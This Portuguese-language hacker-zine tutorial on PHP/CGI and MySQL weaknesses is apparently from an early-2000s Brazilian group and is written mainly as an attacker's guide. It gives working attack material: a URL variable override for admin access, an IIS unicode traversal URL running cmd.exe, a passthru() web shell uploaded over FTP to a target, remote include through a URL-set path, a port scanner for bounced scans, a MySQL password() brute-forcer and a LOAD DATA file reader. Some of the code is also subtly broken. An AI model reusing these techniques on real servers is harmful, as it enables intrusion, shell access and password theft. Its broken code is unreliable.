@@ -1,0 +1,891 @@
+/==============================================================================/
+/======================== Int0x80 && EoH =====================================/
+/============================================================================/
+
+
+http://int0x80.host.sk
+http://eoh-team.tk
+http://unsekurity.virtualave.net
+
+Por
+
+ Jerry Slater -- rx@coredumped.tk
+ http://jerryslater.host.sk
+
+
+
+-> Por favor elitos, crackers, script kiddies, defacers e coisas do
+   genero nao percam seu precioso tempo lendo esse txt.
+
+-> O autor nao se responsabiliza pelo mau uso das informacoes 
+   contidas aqui.
+
+
+
+/////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+/////////////////////////////// CGI PROBLEMS \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+/////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+
+Eh com grande satisfacao q vemos como o hacking cresceu aqui no
+Brasil e a conscientizacao de muitos defacers e script kiddies.
+O Unsek Scene tem papel fundamental nessa mudanca, pois desde
+seu inicio lutou a favor do hacking etico e divulgando o verdadeiro
+sentido do termo hacking.
+Sabemos a batalha ainda esta comecando e q depois do dia 11/09/2001
+o cenario mudou quase q radicalmente, mas jamais devemos fraquejar
+temos q ter na mente q estamos lutando por algo verdadeiro. Apos
+os acontecimentos do dia 11 percebemos quem realmente lutava estava
+lutando pelo hacking, muitos mostraram sua verdadeira face. Basta a 
+coisa apertar para q a verdade transpareca.
+
+"Uma grande jornada se inicia com um unico passo!"
+
+Olhando para o passado, vemos q o Unsek Scene ja deu varios passos e
+olhando para o futuro vemos tambem q a caminhada eh longo, mas
+recompesadora.
+
+
+
+=========================================================================
+
+Indice:
+
+
+ 1 - Futuro da Programacao
+
+ 2 - Introducao ao CGI
+
+	2.1 - PHP
+
+	 2.1.1 - Passagem de variaveis;
+	 2.1.2 - Abertura de arquivos;
+	 2.1.3 - Execucao de comandos;
+         2.1.4 - Problemas com include() e require();
+         2.1.5 - Sockets em PHP;
+	 2.1.6 - Quadro Atual;
+
+ 3 - MySql + CGI
+
+	3.1 - MySql + PHP;
+
+ 4 - Links e Referenciais
+
+ 5 - Consideracoes Finais
+
+=========================================================================
+
+
+
+===========================
+1 - Futuro da Programacao
+===========================
+
+Com o crescimento tecnologico muitas ramos estam migrando para o comercio
+eletronico e junto com isso centenas de programadores que nao dao a minima
+importancia para o fator seguranca.
+Eh de conhecimento de todos que um codigo fonte mal elaborado pode vir a 
+trazer inumeros maleficios para quem o usa, desde um simples travamento
+do sistema ateh uma possibilidade de acesso a dados restritos.
+Nesse txt eu tento abordar alguns furos que muitos programadores deixam
+em seus codigos, parece q eles fazem questao de deixar!
+Esse txt nao foi ecrito com o intuito de ensinar a programar em linguagem
+alguma, se tiver vontade de se aprofundar nessa linguagem a secao de links 
+podera ajuda-lo.
+
+
+
+=======================
+2 - Introducao ao CGI
+=======================
+
+
+Eh espantoso como a internet vem se desenvolvendo no decorrer dos anos e com
+isso muitas linguagens vem sendo criadas para web (PHP, Perl, ASP, Java etc...) 
+e junto com isso as aplicacoes para web (CGI) vem aumentando gradativamente 
+tambem.
+Hoje em dia provedores, ou qualquer empresa q possua site tem programadores
+que cuidam da parte de CGI, mas junto com o crescimento das aplicacoes alguns
+programadores esqueceram um pouco a questao da seguranca.
+O CGI dispoem ao usuario mais recursos facilitando sua vida..:) um exemplo seria
+a uma transferencia bancaria. Quem passaria hoje 1 hora na fila de um banco para
+fazer tal transferendo podendo esta ser feita em 10 minutos via web??
+Um exemplo basico de CGI segue:
+
+++++++++++++++++++++++++++ cgi.htm ++++++++++++++++++++++++++++++++++++++++++
+
+<html>
+<head>
+<title> CGI </title>
+</head>
+
+<body>
+<h3> Simples CGI </h3>
+<hr>
+<br>
+<form name="cgi1" action="cgi-final.php" method="post">
+Nome: <input type="text" name="user" size=8>
+<br>
+<input type="submit" value="Avancar">
+
+</form>
+
+</body>
+</html>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Abra com qualquer browser
+
+++++++++++++++++++++++++++ cgi-final.php ++++++++++++++++++++++++++++++++++++
+
+<?
+ 
+ print "<h2>Bem-vindo $user</h2>";
+
+?>
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Para que o CGI funcione normalmente eh necessario q vc tenha em seu sistema um
+web server instalado, indico o apache..:) e coloque os arquivos dentro do 
+diretorio apontado pelo DocumentRoot, por default eh o htdocs.
+
+Podemos ver no CGI acima q atraves do formulario a variavel user foi passada
+ao cgi-final.php, entao... eh mais ou menos assim que o cgi funciona.
+
+===========
+2.1 - PHP
+===========
+
+
+Uma das liguagens que mais crescem atualmente devido a sua facilidade de aprendizado.
+Mas, talvez, devido a essa facilidade muitos "programadores" estao partindo para
+o PHP e junto com isso os inumeros problemas de seguranca. Veja bem, eu nao estou
+generalizando pois conheco muitos programadores que realmente se importam com o
+fator seguranca..:)
+
+==============================
+2.1.1 - Passagem de variaveis
+==============================
+
+
+Como vimos nos exemplos acima variaveis podem ser passadas aos CGI's em PHP
+via formularios ou via browser.
+Como ja falei, alguns programadores tem deixado a questao seguranca em 
+segundo plano.
+Exemplo de codigo bugado:
+
+++++++++++++++++++++++++ form.html +++++++++++++++++++++++++++++++++++++++++++
+
+<html>
+<head>
+<title> CGI </title>
+</head>
+
+<body>
+<h3> Autenticao </h3>
+<hr>
+<br>
+<form name="cgi1" action="checa.php" method="post">
+User: <input type="text" name="user" size=8>
+<br>
+Senha: <input type="password" name="senha" size=8>
+<br>
+<br>
+<input type="submit" value="Avancar">
+
+</form>
+
+</body>
+</html>
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+++++++++++++++++++++++++++ checa.php +++++++++++++++++++++++++++++++++++++++++++
+
+<?
+
+ /* Suponha que login e senha passaram por uma devida verificao. 
+    Oberve o trecho de codigo abaixo.	*/
+
+ if (!(strcasecmp($user, "Administrador"))) $nivel = 0;
+
+ if ($nivel) print "Vc eh insignificante aqui!";
+ else print "Bem-vindo mestre!";
+
+ /* Resto do Codigo baseado na variavel $nivel. */
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	
+
+Podemos notar q a variavel $nivel foi setada de acordo com o login do usuario
+e que o resto do codigo se baseia no $nivel.
+Possuindo uma conta como usuario normal podemos facilmente, via url, passar por
+esse tipo de atribuicao. Note a url abaixo.
+
+http://localhost/checa.php?user=Jerry+Slater&senha=12345&nivel=0
+
+Temos aqui o usuario Jerry Slater, que esta cadastrado no sistema, que acaba de ganhar
+o mesmo nivel de acesso do administrador simplesmente passando a variavel $nivel via url.
+E evidente q um erro de programacao desse pode ser facilmente corrigido, mas pq 
+alguns programadores continuam a fazer coisas desse tipo???
+
+As vezes algumas pessoas acham q a leitura de arquivos eh irrelevante na questao de 
+seguranca, mas note q vc podendo ler o codigo fonte vc pode cacar furos de programcao
+para, no minimo, aumentar seu nivel de privilegio.
+
+=============================
+2.1.2 - Abertura de arquivos
+=============================
+
+
+Em PHP as principais funcoes utilizadas para abertura e fechamento de arquivos sao
+fopen() e fclose() respectivamente.
+
+Um exemplo tipico de abertura de um arquivo seria:
+
++++++++++++++++++++++++++ olha.php +++++++++++++++++++++++++++++++++++++++++++
+
+<?
+
+ $arquivo="/etc/passwd";
+ $abre=fopen("$arquivo", "r");
+ if (!$abre) {
+  print "Erro ao abrir o arquivo";
+  exit (0);
+ }
+
+ for ($i=0; !feof($abre); $i++) {
+
+  $lendo=fgetc($abre);
+  if ($lendo == '\n') print "<br>";
+  print "$lendo";  
+
+ }
+
+ fclose($abre);
+
+?> 
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Podemos notar q o programa acima abre o /etc/passwd e mostra-o no browser.
+Imagine num CGI o usuario podendo informar qual arquivo ele gostria de ler
+no sistema. Oq o impede de user setar a variavel $arquivo para:
+
+$arquivo="http://unsekurity.virtualave.net/txts/beige.txt";
+
+Automaticamente ira haver uma conexao com o host e o arquivo sera exibido
+normalmente.
+Se abrir um arquivo locatozado em outro server, oq nos proibe de exploitarmos
+um ISS bugado com o unicode??? Nada nos proibe.
+
+$arquivo="http://localhost/scripts/..%c0%af../winnt/system32/cmd.exe?/dir+c:"
+
+
+Entao nessa situacao estamos usando um bounce para poder explorar nosso alvo,
+pois ha um host entre nos e nosso alvo e esse host esta sendo utilizado para
+execucao do nosso objetivo.
+
+=============================
+2.1.3 - Execucao de Comandos
+=============================
+
+As principais funcoes responsaveis pela exeucao de comandos do sistema em
+PHP sao as funcoes passthru() e exec().
+
+Muitos servidores de ftp q permitiam o acesso anonymous com permissoes de escrita
+e com web server com suporte a PHP enxergando os diretorios sofreram nas maos
+de script kiddies. Uma das coisas q me chama a atencao eh uma pessoa q praticamente
+nao sabe nem usar o gcc com outro parametro a nao ser o -o quer ser chamada de hacker.
+
+Eu sei q ninguem nasce sabendo, mas porq esse tipo de gente soh pensa em ter seu nick
+numa pagina e ganhar fama fazendo com q outros achem q ele(a) eh o tal. Usar exploits
+de terceiros eh normal quando vc quer ter acesso a um sistema exotico o qual vc nao 
+tem condicoes de adquiri-lo como um digital unix.
+
+Voltando ao assunto, tendo acesso a um server rodando web+PHP e ftp facilmente vc
+conseguira executar comandos arbitrarios.
+Vamos lah...
+
+Primeiro criaremos um arquivo .php q executara nosso comando.
+
++++++++++++++++++++++++++ executa.php +++++++++++++++++++++++++++++++++++++++++
+
+<?
+
+passthru ("/bin/ls /");
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Para melhorar nosso esquema, poderiamos criar um formulario que passasse ao
+executa.php uma variavel com um comando aleatorio.
+
+Alguns servidores desabilitam o uso da funcao passthru(), mas existem outras
+funcoes q vc usar para execucao de comandos q eles esquecem de bloquear.
+
+Em seguida colocamos nosso arquivo no host alvo.
+
+[jslater]:~$ftp host.alvo
+220 host.alvo FTP server (Version wu-2.6.0(1) Fri Oct 22
+00:38:20 CDT 1999) ready.
+Name (host.alvo:jslater):slater
+331 Password required for slater.
+Password:1234
+230 User fork logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>pwd
+257 "/home/apache/htdocs/all/slater" is current directory.
+ftp>put
+(local-file)executa.php
+(remote-file)executa.php
+local: executa.php remote: executa.php
+200 PORT command successful.
+150 Opening BINARY mode data connection for teste.php.
+226 Transfer complete.
+ftp>quit
+221-You have transferred 0 bytes in 1 files.
+221-Total traffic for this session was 427 bytes in 1 transfers.
+221-Thank you for using the FTP service on darkstar.example.net.
+221 Goodbye.
+
+
+Agora basta usarmos um browser qualquer para execucao do comando.
+
+[jslater]:~$lynx http://host.alvo/all/fork/executa.php
+
+Entao temos como resultado:
+
+bin boot cdrom dev etc home lib lost+found mnt opt proc root sbin
+shlib tmp usr var vmlinuz
+
+Entao caro amigo, podemos agora executar comandos no server nao como
+usuario fork, mas sim como..:)
+
+uid=99(nobody) gid=98(nobody) groups=98(nobody)
+
+Com esse esquema vc pode ter acesso shell a muitos servers por ai,
+use-os sempre para aprender, nunca para se promover!
+
+
+============================================
+2.1.4 - Problemas com include() e require()
+============================================
+
+
+Uma das funcoes bastante utilizadas no PHP eh a funcao include() e a
+funcao require(). Esta tem o objetivo de incluir algo dentro do seu codigo PHP,
+por exemplo.
+
++++++++++++++++++++++++++ teste_inc.php ++++++++++++++++++++++++++++++++++++++++
+
+<?
+
+include ("/etc/host");
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Isso mostrara todo conteudo do arquivo /etc/host no seu browser.
+
+Quando essas funcoes sao usadas, o PHP usa uma variavel ambiente chamada
+$LD_LIBRARY_PATH para procurar o arquivo especificado, essa variavel eh o
+PATH do PHP..:)
+
+Como o PHP nao tem controle sobre as variaveis ambientes nos poderiamos
+fazer com q o include aponde para um codigo elaborado por nos. 
+Atente para o esquema abaixo:
+
++++++++++++++++++++++++++ inc_vuln.php ++++++++++++++++++++++++++++++++++++++
+
+<?
+
+include ($finddir ."./docs.php");
+
+/* Aqui segue o resto do CGI */
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Podemos observar que ao usarmos include() o PHP colocara o arquivo
+docs.php no nosso cgi. O path para docs.php esta definido pela variavel
+$finddir.
+Poderiamos via url setar a varialvel $finddir para apontar para um arquivo
+docs.php criado por nos.
+
+http://www.host.alvo/inc_vuln.php?finddir=/home/ftp/all/jerryslater
+
+Lah criariamos um docs.php contendo oq nos quisessemos..:)
+
+Outro problema referente ao uso de include() ou require() esta no path
+utilizado automaticamente pelo PHP.
+
+No exemplo acimo nos usamos um include() junto com um path definido pela
+variavel $finddir, mas no includes usados dessa forma include
+("docs.php") o q podemos fazer?
+
+O PHP extrai o seu path de uma variavel ambiente chamada LD_LIBRARY_PATH.
+Por default essa variavel ambiente vem em safe mode no php.ini:
+
+safe_mode_protected_env_vars = LD_LIBRARY_PATH;
+
+Entao, ela esta impossibilitada de ser setada via url ou pela funcao
+putenv(). Mas em alguns hosts eu encontrei-a desprotegida..:)
+
+
+=======================
+2.1.5 - Sockets em PHP
+=======================
+
+
+O PHP tb suporta o uso de sockets, mas para isso eh necessario q na
+hora da compilacao o suporte a sockets seja habilitado.
+
+A maioria dos sistemas hoje ja compila o PHP com essa opcao para q
+possam utilizar mais recursos como chats, etc. Abaixo segue um esquema
+simples de sockets.
+
++++++++++++++++++++++++++++++++ sock.php ++++++++++++++++++++++++++++++++++++++
+
+<?
+
+$porta=21;
+$host= gethostbyname("www.host.alvo.com.br");
+
+if (($sock = socket_create (AF_INET, SOCK_STREAM, 0) <0) {
+ print "Erro ao conectar!";
+ exit (1);
+}
+
+socket_connect ($sock, $host, $porta);
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Aqui nesse exemplo vemos que o usuario se conecta no host alvo na
+porta 21.
+
+Com sockets nos podemos explorar algumas coisinhas no host alvo.
+
+No texto sobre Web Bouncing feito por Nash Leon ele descreve um esquema de
+se executar um scanner a partir de um servidor web. Abaixo segue outro
+codigo de um scanner em PHP.
+
+
++++++++++++++++++++++++++++++++ scann.php ++++++++++++++++++++++++++++++++++++++
+
+<?
+
+print "<h3>Int0x80 && EoH</h3>";
+print "<h4>Scan for Bounce</h4>";
+print "<h4>Desenvolvido por Jerry Slater</h4>";
+print "<h4>Thanks Unsekurity Scene</h4>";
+print "<h4>http://int0x80.host.sk</h4>";
+print "<h4>http://eoh-team.tk</h4>";
+print "<h4>http://unsekurity.virtualave.net</h4>";
+
+
+$porta_inicial = 0;
+$porta_final = 10000;
+$host = gethostbyname('localhost');
+
+
+error_reporting (0);
+
+
+while ($porta_inicial < $porta_final) {
+
+if (($sock=socket_create(AF_INET, SOCK_STREAM, 0)) < 0) {
+ print "Erro na conexao!";
+ exit ();
+}
+
+$conexao = socket_connect($sock, $host, $porta_inicial);
+
+if ($conexao == 1) {
+
+ $servico = getservbyport($porta_inicial, "tcp");
+
+ if ($servico != NULL) {
+ print "Porta $porta_inicial -- $servico aberta!<br>";
+ }
+ else {
+ print "Porta $porta_inicial -- Unknow aberta!<br>";
+ }
+
+}
+
+socket_close($sock);
+
+$porta_inicial++;
+
+}
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Com isso vc podera utilizar "pontes" para fazer o scanneamento..:)
+
+O PHP jah possui muitos funcoes para o uso de sockets (socket_bind, socket_listen,
+socket_accept, etc), com isso vc pode criar diversos esquemas para conseguir algo
+proveito.
+
+Outro esquema que pode ser usado com sockets em PHP eh a realizacao de um Brutal
+Force.
+
+
+=====================
+2.1.6 - Quadro Atual
+=====================
+
+
+Atualmente ficou notorio as muitas vulnerabilidades encontradas no proprio PHP,
+nada relacionado a CGI's.
+
+Sabemos que PHP foi construido sobre C e com isso, problemas relacionados a buffer
+overflow nao poderiam ficar de fora.
+
+Alem de problemas relacionados aos cgi's, tecnicas como input validation podem
+ser utilizadas para hacking de web. A pouco tempo a macromedia lancou um soft
+para otimizar o desenvolvimento de sites dinamicos. Particularmente ainda nao
+tive oportunidade de ler um codigo desenvolvido por ele, mas vale a pena dar 
+uma olhadinha..:)
+
+Nesse txt nao abordarei o tao conhecido PHP-nuke...:)
+As vulnerabilidades vem atormentando muitas redes, diga uma rede famosa
+de irc...:)
+
+==================
+3.0 - MySQL + CGI
+==================
+
+
+Hoje acho q nao existe nenhum ramo aonde nao possua um banco de dados, pois esse 
+facilita bastante a nossa vida...:) imagina ai depender sempre da nossa memoria..:)
+A cada dia a interacao banco de dados e web vem aumentando e junto com essa interacao
+alguns furinhos vem aumentando tb..:)
+
+Soh abordarei aqui nesse txt a parte de MySQL relacionada a PHP, futuramente
+eu passarei mais esquemas com outros bancos de dados.
+
+==================
+3.1 - MySQL + PHP
+==================
+
+
+Como jah foi dito na secao 2.1 o PHP a cada dia cresce e como nao poderia deixar
+de ser diferente o leque de possibilidades de uso do PHP vem aumentando tb.
+Algumas funcoes basicas para que se possa trabalhar com MySQL e PHP sao:
+
+mysql_connect --> conexao com o banco de dados
+mysql_query   --> envia uma determinada query ao banco de dados
+mysql_result  --> pega a resposta de uma determinada query
+
+existem muitas outras... mas por enquanto vamos ficar por aqui.
+
+Nao irei expor o quao eh perigoso a possibilidade de leitura de arquivos em um 
+sistema, alguns julgam sem importancia, mas sera q eh assim????
+Prestemos atencao no codigo abaixo:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+<?
+
+$bancodados = "hostalvo";
+$usuario = "qwerty";
+$senha = "12345";
+
+$conexao = mysql_connect("host.alvo.com", $usuario, $senha);
+
+....
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Podemos ver q pegamos a o login e a senha para conexao com o banco de dados,
+com isso poderiamos criar um simples PHP para executarmos comando lah na base
+de dados.
+Primeiro vamos dar uma olhada nas tableas existentes.
+
++++++++++++++++++++++++++++ checatabela.php +++++++++++++++++++++++++++++++++++
+
+<?
+
+$conexao = mysql_connect("host.alvo.com", "qwerty", "12345");
+mysql_select_db("hostalvo");
+$comando = "SHOW TABLES";
+$envcom = mysql_query($comando);
+$linhas = mysql_num_rows($envcom);
+
+for ($i=0; $i < $linhas; $i++) {
+ $resultado = mysql_result($envcom, $i, 0);
+ print "$resultado<br>";
+}
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Resultado:
+
+cadastro
+estoque
+fornecedores
+
+Vamos dar uma olhadinha na tabela cadastro..:)
+
++++++++++++++++++++++++++++ nosso.php +++++++++++++++++++++++++++++++++++++++++
+
+<?
+
+
+$conexao = mysql_connect("host.alvo.com", "qwerty", "12345");
+mysql_select_db("hostalvo");
+$comando = "select * from cadastro";
+$envcom = mysql_query($comando);
+$linhas = mysql_num_rows($envcom);
+$colunas = mysql_num_shields($envcom);
+
+for ($j=0; $j < $linhas; $j++) {
+
+ for ($i=0; $i < $colunas; $i++) {
+  $resultado = mysql_result($envcom, $j, $i);
+  print "$resultado  ";
+  }
+ print "<br>";
+}
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Com isso teriamos facilemente o conteudo da tabela cadastro
+
+Carlos  carlosedf
+Marcos  m4hf866
+Claudia 458opiu
+.......
+
+Isso eh bastante provavel q sejam logins e senhas..:)
+Para termos certeza basta usarmos uma query com describe ("DESCRIBE cadastro").
+
+Mas, para nossa felicidade, exitem programadores preoculpados com q questao 
+seguranca e alguns usam funcoes do proprio MySQL para encriptar os dados ali
+contidos, uma funcao "bastante" utilizada eh a password().
+
+72c5426a09550d99 22c438c01e897606
+7a3187a3411729bc 77c3c443286d8382
+096b150938c5d8e8 02e0398c10f555b3
+
+Com isso, nosso trabalho de fucador poderia tornar-se mais compicado.
+Abaixo segue um brutal force para essa funcao, repito, o brutal force
+eh focalizado apenas nessa funcao password().
+
++++++++++++++++++++++++++++++ brutalpass.php ++++++++++++++++++++++++++++++++++
+
+<?
+
+print "<h3>Int0x80 && EoH</h3>";
+print "<h4>Simples Brutal Force para ftp</h4>";
+print "<h4>Desenvolvido por Jerry Slater</h4>";
+print "<h4>Thanks Unsekurity Scene</h4>";
+print "<h4>http://int0x80.host.sk</h4>";
+print "<h4>http://eoh-team.tk</h4>";
+print "<h4>http://unsekurity.virtualave.net</h4>";
+
+
+$host = "127.0.0.1";			// IP do Servidor
+$user = "user";				// Login
+$senha = "senha";			// Senha
+$dbname = "cadastro";			// Nome do DB
+$passwdlist = "passwd.lst";		// Nome da password list
+
+$conecta = mysql_connect (localhost, "root");
+
+mysql_select_db($dbname);
+
+$comando = "SELECT * FROM cadastro";
+$env_com = mysql_query($comando);
+$linhas = mysql_num_rows($env_com);
+
+$arquivo = fopen ("passwdord.lst", "r");
+
+while (!feof($arquivo)) {
+
+ $caracter = fgets($arquivo, 50);
+ $login = trim($caracter);
+
+ $cmd = "SELECT (PASSWORD(\"$login\"))";
+ $env_query = mysql_query($cmd);
+
+ $login_encrp = mysql_result($env_query, 0, 0);
+
+
+ for ($i=0; $i < $linhas; $i++) {
+
+  $login_db = mysql_result($env_com, $i, 0);
+
+  if (!strcmp($login_encrp, $login_db)) {
+
+	print "Login: $caracter           ";
+	$arquivo2 = fopen ("passwdord.lst", "r");
+
+	while (!feof($arquivo2)) {
+
+	 $caracter2 = fgets($arquivo2, 50);
+	 $passwd = trim($caracter2);
+
+	 $cmd2 = "SELECT (PASSWORD(\"$passwd\"))";
+	 $env_query2 = mysql_query($cmd2);
+
+	 $passwd_encrp = mysql_result($env_query2, 0, 0);
+	 	
+	 for ($j=0; $j < $linhas; $j++) {
+	 
+	  $passwd_db = mysql_result($env_com, $i, 1);
+
+          if (($page=strcmp($passwd_encrp, $passwd_db)) == 0) {
+		print "Password: $caracter2<br>";
+		break;
+	}
+
+  }
+	if ($page == 0) break;
+
+}
+
+}
+
+}
+
+}
+
+mysql_close($conecta);
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+Com acesso ftp podemos explorar de muitas maneiras um servidor. Na page do
+Unsekurity Scene existe um txt feito pelo Nash Leon sobre o truque do 
+PHP + FTP = SHELL.
+
+Alem disso, podemos criar cgi's que junto com mysql podemos ler quase
+todos os arquivos de um host.
+
+
+++++++++++++++++++++++++++++ readfile.php ++++++++++++++++++++++++++++++++++++++
+
+<?
+
+print "<h3>Int0x80 && EoH</h3>";
+print "<h4>Read File</h4>";
+print "<h4>Desenvolvido por Jerry Slater</h4>";
+print "<h4>Thanks Unsekurity Scene</h4>";
+print "<h4>http://int0x80.host.sk</h4>";
+print "<h4>http://eoh-team.tk</h4>";
+print "<h4>http://unsekurity.virtualave.net</h4>";
+
+
+$host = "127.0.0.1";                    // IP do Servidor
+$user = "user";                         // Login
+$senha = "senha";                       // Senha
+$dbname = "cadastro";                   // Nome do DB
+
+$conecta = mysql_connect (localhost, "root");
+
+mysql_select_db($dbname);
+
+$comando = "CREATE TABLE file (arq blob)";
+$query = mysql_query($comando);
+
+if ($arquiv == NULL) {
+ print "Quem eh voce????";
+ exit();
+}
+
+else {
+ $comando2 = "LOAD DATA LOCAL INFILE \"$arquiv\" INTO TABLE file";
+ $query = mysql_query($comando2);
+}
+
+$cmd = "SELECT * FROM file";
+$query = mysql_query($cmd);
+
+$linhas = mysql_num_rows($query);
+
+for ($i=0; $i < $linhas; $i++) {
+
+ $result = mysql_result($query, $i, 0);
+ print "$result<br>";
+}
+
+?>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+No esquema acima, eh soh passar o valor da variavel arquiv via url que o
+arquivo sera carregado dentro do banco de dados.
+
+Outra tecnica q pode ser usada eh a tecnica de Input Validation que consiste em
+forcar uma entrada diferente no alvo, mas isso fica para um proximo txt.
+
+Futuramente o Int0x80 junto com o EoH ira disponibilizar mais material abordando
+problemas com cgi em outras linguagens. Tenha em mente tambem que alguns fatores
+abordados aqui sao expansiveis a outras linguagens.
+
+========================
+4 - Links e Referencias
+========================
+
+
+A Study In Scarlet - Exploiting Common Vulnerabilities in PHP Applications
+
+http://www.kimera.com.br
+http://unsekurity.virtualave.net
+http://int0x80.host.sk
+http://eoh-team.tk
+
+http://packetstorm.decepticons.org
+http://www.securityfocus.com
+http://www.linuxsecurity.com.br
+
+
+=========================
+5 - Consideracoes Finais
+=========================
+
+
+Bem pessoal... devemos sempre ter em mente a etica antes tomar qualquer atitude
+ou decisao em nossas vidas, nao falo isso somente em relacao ao hacking, mas em
+relacao a tudo.
+
+Outro ponto que merece atencao eh o "nivel" dos programadores q estao entrando no
+mercado, quase a maioria nao ligam nada para o fator seguranca e com isso o usuario
+final acaba sendo prejudicado.
+
+Fico feliz em poder contribuir para a liberdade de informacao, embora ainda exista
+muito egoismo tanto na informatica como no mundo.
+
+Agradeco aqui aos meus verdadeiros amigos, nao vou citar nicks pois eles sabem quem
+sao. Agradeco tb o Unsek Scene, ao int0x80 e ao EoH por terem me fornecido esse
+espaco...:)
+
+
+=========================================================================
+
+. Jerry Slater - rx@coredumped.tk
